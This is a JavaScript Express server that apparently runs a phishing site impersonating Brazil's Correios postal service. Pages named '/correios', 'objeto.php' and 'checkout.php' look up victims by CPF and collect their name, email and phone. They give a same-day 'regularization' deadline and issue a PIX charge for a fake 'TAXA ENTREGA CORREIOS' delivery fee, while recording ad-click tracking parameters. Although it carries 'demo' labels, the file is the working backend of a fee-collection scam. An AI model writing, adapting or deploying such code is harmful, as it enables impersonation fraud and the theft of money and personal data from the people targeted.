import express from 'express';
import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const app = express();
const PORT = process.env.PORT || 8080;

const config = {
  amount: 58.36,
  product_key: 'main',
  city: 'Curitiba',
  state: 'PR',
  cpf_lookup_nonce: 'bde6818eeddc0201f9b6d80e17acb948',
  customer_flow_nonce: 'e8581726cd6c71ddf21852cfe43c867d',
  checkout_cpf_nonce: '92e3e85ff8d687d36f46624b1bfc10b6',
  demo_pix_paid_after_seconds: 45,
  cpf_database: {
    '52998224725': 'João Silva',
    '11144477735': 'Maria Souza',
    '39053344705': 'Carlos Mendes',
  },
};

const dataDir = path.join(__dirname, 'data');
const chargesFile = path.join(dataDir, 'charges.json');
const sessions = new Map();

function ensureDataDir() {
  if (!fs.existsSync(dataDir)) fs.mkdirSync(dataDir, { recursive: true });
}

function loadCharges() {
  ensureDataDir();
  if (!fs.existsSync(chargesFile)) return {};
  return JSON.parse(fs.readFileSync(chargesFile, 'utf8'));
}

function saveCharges(charges) {
  ensureDataDir();
  fs.writeFileSync(chargesFile, JSON.stringify(charges, null, 2));
}

function normalizeCpf(cpf) {
  return String(cpf || '').replace(/\D/g, '').slice(0, 11);
}

function isValidCpf(cpf) {
  const digits = normalizeCpf(cpf);
  if (digits.length !== 11 || /^(\d)\1{10}$/.test(digits)) return false;
  for (let t = 9; t < 11; t++) {
    let sum = 0;
    for (let i = 0; i < t; i++) sum += Number(digits[i]) * (t + 1 - i);
    let check = ((10 * sum) % 11) % 10;
    if (Number(digits[t]) !== check) return false;
  }
  return true;
}

function formatCpf(cpf) {
  const digits = normalizeCpf(cpf);
  return digits.replace(/^(\d{3})(\d{3})(\d{3})(\d{2})$/, '$1.$2.$3-$4');
}

function demoBrCode(amount, chargeId) {
  const value = amount.toFixed(2);
  return `00020126580014BR.GOV.BCB.PIX0136demo-${chargeId}520400005303986540${value.length}${value}5802BR5925TAXA ENTREGA CORREIOS6009CURITIBA62070503***6304DEMO`;
}

function getSessionId(req) {
  const cookie = req.headers.cookie || '';
  const match = cookie.match(/sid=([^;]+)/);
  if (match) return match[1];
  const sid = `sess_${Date.now().toString(36)}`;
  req.generatedSid = sid;
  return sid;
}

function getSession(req) {
  const sid = getSessionId(req);
  if (!sessions.has(sid)) sessions.set(sid, { customer: {}, tracking: {} });
  return { sid, data: sessions.get(sid) };
}

app.use(express.json());
app.use((req, res, next) => {
  const { sid, data } = getSession(req);
  if (req.generatedSid) {
    res.setHeader('Set-Cookie', `sid=${req.generatedSid}; Path=/; HttpOnly; SameSite=Lax`);
  }
  req.session = data;
  req.sid = sid;
  next();
});

app.get('/api.php', (req, res) => {
  const cpf = normalizeCpf(req.query.cpf);
  const nonce = String(req.query.nonce || '');
  if (![config.cpf_lookup_nonce, config.checkout_cpf_nonce].includes(nonce)) {
    return res.status(403).json({ found: false, error: 'Nonce invalido' });
  }
  if (!isValidCpf(cpf)) return res.json({ found: false, error: 'CPF invalido' });
  const name = config.cpf_database[cpf];
  if (name) return res.json({ found: true, data: { NOME: name } });
  return res.json({ found: false, error: 'Nao foi possivel consultar este CPF agora' });
});

app.post('/save_customer.php', (req, res) => {
  if (req.body?.nonce !== config.customer_flow_nonce) {
    return res.status(403).json({ success: false, error: 'Nonce invalido' });
  }
  const cpf = normalizeCpf(req.body?.cpf);
  const nome = String(req.body?.nome || '').trim();
  if (!isValidCpf(cpf) || nome.length < 3) {
    return res.status(422).json({ success: false, error: 'Payload invalido' });
  }
  req.session.customer = {
    cpf,
    nome,
    name: nome,
    email: req.body?.email || '',
    telefone: String(req.body?.telefone || '').replace(/\D/g, ''),
  };
  res.json({ success: true });
});

app.post('/api_pix_proxy.php', async (req, res) => {
  const name = String(req.body?.name || '').trim();
  const document = normalizeCpf(req.body?.document);
  const email = String(req.body?.email || '').trim();
  const telephone = String(req.body?.telephone || '').replace(/\D/g, '');
  if (!isValidCpf(document) || name.length < 3 || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email) || telephone.length < 10) {
    return res.status(422).json({ success: false, error: 'Payload invalido' });
  }
  const chargeId = `chg_${Math.random().toString(36).slice(2, 10)}`;
  const statusNonce = Math.random().toString(36).slice(2) + Math.random().toString(36).slice(2);
  const brCode = demoBrCode(config.amount, chargeId);
  const charges = loadCharges();
  charges[chargeId] = {
    id: chargeId,
    status_nonce: statusNonce,
    paid: false,
    paid_after: Math.floor(Date.now() / 1000) + config.demo_pix_paid_after_seconds,
  };
  saveCharges(charges);
  const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(brCode)}`;
  let dataUri = '';
  try {
    const qrRes = await fetch(qrUrl);
    if (qrRes.ok) {
      const buf = Buffer.from(await qrRes.arrayBuffer());
      dataUri = `data:image/png;base64,${buf.toString('base64')}`;
    }
  } catch (_) {}
  res.json({
    success: true,
    data: {
      id: chargeId,
      status_nonce: statusNonce,
      brCode,
      pix: { qr_code: { data_uri: dataUri } },
    },
  });
});

app.get('/api_payment_status_proxy.php', (req, res) => {
  const reference = String(req.query.reference || '');
  const nonce = String(req.query.nonce || '');
  const charges = loadCharges();
  const charge = charges[reference];
  if (!charge || charge.status_nonce !== nonce) {
    return res.status(404).json({ success: false, error: 'Cobranca nao encontrada' });
  }
  const now = Math.floor(Date.now() / 1000);
  const paid = charge.paid || now >= charge.paid_after;
  if (paid && !charge.paid) {
    charge.paid = true;
    saveCharges(charges);
  }
  res.json({ success: true, data: { paid, thankYouUrl: 'checkout.php?paid=1' } });
});

function escapeHtml(value) {
  return String(value)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;');
}

function renderObjetoHtml({ cpf, nome, tracking = {} }) {
  const cpfFormatado = cpf ? formatCpf(cpf) : '000.000.000-00';
  const nomeExibicao = nome || 'Cliente';
  const primeiroNome = nomeExibicao.split(' ')[0];
  const hoje = new Date();
  const prazoRegularizacao = hoje.toLocaleDateString('pt-BR');
  const entrega = new Date(hoje);
  entrega.setDate(entrega.getDate() + 6);
  const prazoEntrega = entrega.toLocaleDateString('pt-BR');
  const trackingQuery = new URLSearchParams(tracking).toString();
  const checkoutSuffix = trackingQuery ? `?${trackingQuery}` : '';

  let html = fs.readFileSync(path.join(__dirname, 'objeto.php'), 'utf8');
  html = html.replace(/^<\?php[\s\S]*?\?>\s*/, '');

  return html
    .replace(/<\?php echo htmlspecialchars\(\$nomeExibicao, ENT_QUOTES, 'UTF-8'\); \?>/g, escapeHtml(nomeExibicao))
    .replace(/<\?php echo htmlspecialchars\(\$cpfFormatado, ENT_QUOTES, 'UTF-8'\); \?>/g, escapeHtml(cpfFormatado))
    .replace(/<\?php echo htmlspecialchars\(\$primeiroNome, ENT_QUOTES, 'UTF-8'\); \?>/g, escapeHtml(primeiroNome))
    .replace(/<\?php echo htmlspecialchars\(\$cidade, ENT_QUOTES, 'UTF-8'\); \?>/g, escapeHtml(config.city))
    .replace(/<\?php echo htmlspecialchars\(\$estado, ENT_QUOTES, 'UTF-8'\); \?>/g, escapeHtml(config.state))
    .replace(/<\?php echo \$prazoEntrega; \?>/g, prazoEntrega)
    .replace(/<\?php echo \$prazoRegularizacao; \?>/g, prazoRegularizacao)
    .replace(/<\?php echo htmlspecialchars\(\$checkoutSuffix, ENT_QUOTES, 'UTF-8'\); \?>/g, checkoutSuffix);
}

app.get('/objeto.php', (req, res) => {
  const cpf = normalizeCpf(req.query.cpf || req.session.customer?.cpf || '');
  const nome = String(req.query.nome || req.session.customer?.nome || req.session.customer?.name || 'Cliente').trim();
  if (cpf && nome) req.session.customer = { ...req.session.customer, cpf, nome, name: nome };
  res.type('html').send(renderObjetoHtml({ cpf, nome, tracking: req.session.tracking || {} }));
});

app.get('/checkout.php', (req, res) => {
  let html = fs.readFileSync(path.join(__dirname, 'checkout.php'), 'utf8');
  html = html.replace(/^<\?php[\s\S]*?\?>\s*/, '');

  const customer = req.session.customer || {};
  const amountFormatted = config.amount.toFixed(2).replace('.', ',');
  const tracking = req.session.tracking || {};
  const checkoutConfigScript = `<script>
    window.CHECKOUT_CONFIG = ${JSON.stringify({
      initialCustomerName: customer.nome || customer.name || '',
      initialCustomerDocument: customer.cpf || '',
      customerEmail: customer.email || '',
      customerTelephone: customer.telefone || '',
      trackingData: tracking,
      productKey: config.product_key,
      cpfLookupNonce: config.checkout_cpf_nonce,
      amount: config.amount,
      clientScope: 'local',
    })};
    </script>`;

  html = html
    .replace(/<script>\s*window\.CHECKOUT_CONFIG[\s\S]*?<\/script>\s*/i, `${checkoutConfigScript}\n    `)
    .replace(/<\?php echo \$amountFormatted; \?>/g, amountFormatted);

  res.type('html').send(html);
});

app.get(['/', '/correios', '/index.php'], (req, res) => {
  const trackingKeys = ['utm_source', 'utm_medium', 'utm_campaign', 'utm_content', 'utm_term', 'src', 'campaign', 'fbclid', 'gclid', 'click_id'];
  trackingKeys.forEach((key) => {
    if (req.query[key]) req.session.tracking[key] = String(req.query[key]);
  });

  let html = fs.readFileSync(path.join(__dirname, 'index.php'), 'utf8');
  const phpBlock = html.match(/^<\?php[\s\S]*?\?>\s*/);
  if (phpBlock) html = html.slice(phpBlock[0].length);

  const trackingQuery = new URLSearchParams(req.session.tracking).toString();
  const appConfigScript = `<script>window.APP_CONFIG = ${JSON.stringify({
    cpfLookupNonce: config.cpf_lookup_nonce,
    customerFlowNonce: config.customer_flow_nonce,
    trackingUrl: trackingQuery,
  })};</script>`;
  html = html.replace(/<script>\s*window\.APP_CONFIG[\s\S]*?<\/script>\s*/i, `${appConfigScript}\n  `);

  res.type('html').send(html);
});

app.use(express.static(path.join(__dirname, 'public'), { index: false }));

// local dev
if (process.env.VERCEL !== '1') {
  app.listen(PORT, () => {
    console.log(`Servidor em http://localhost:${PORT}`);
  });
}

export default app;
